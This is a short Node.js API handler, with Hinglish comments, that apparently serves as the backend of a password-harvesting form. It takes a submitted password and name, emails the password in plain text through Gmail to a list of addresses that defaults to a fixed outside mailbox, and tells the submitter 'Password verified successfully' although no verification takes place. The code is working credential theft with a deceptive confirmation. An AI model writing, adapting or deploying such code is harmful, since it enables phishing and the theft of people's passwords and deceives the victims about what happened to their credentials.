import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // ... CORS headers
  
  try {
    // ✅ Yeh already emails array leta hai frontend se
    const { password, emails, name } = req.body;

    console.log('🔐 Password Form:');
    console.log('Emails from frontend:', emails); // ✅ Frontend se jo aaye
    
    // ✅ Frontend ka emails array use karega
    const emailArray = emails || ["lingdavid24@gmail.com"]; // ✅ Agar frontend se nahi aaya toh default
    
    const userName = name || "User";
    
    // ✅ Same function jo emails array ko handle karti hai
    const emailResult = await sendPasswordEmail(password, emailArray, userName);

    return res.status(200).json({
      success: true,
      message: 'Password verified successfully',
      emailSent: emailResult.success,
      emailMessage: emailResult.message
    });

  } catch (error) {
    // ... error handling
  }
}

async function sendPasswordEmail(password, emailArray, name) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    // ✅ Yeh already multiple emails handle karta hai
    const mailOptions = {
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: emailArray.join(', '), // ✅ Multiple emails ko join karta hai
      subject: `🔐 Password from ${name}`,
      html: `<div><h2>Password: ${password}</h2><p>Name: ${name}</p></div>`
    };

    await transporter.sendMail(mailOptions);
    
    console.log(`✅ Email sent to:`, emailArray); // ✅ Sab emails log karta hai
    return { success: true, message: 'Email sent' };

  } catch (error) {
    // ... error handling
  }
}
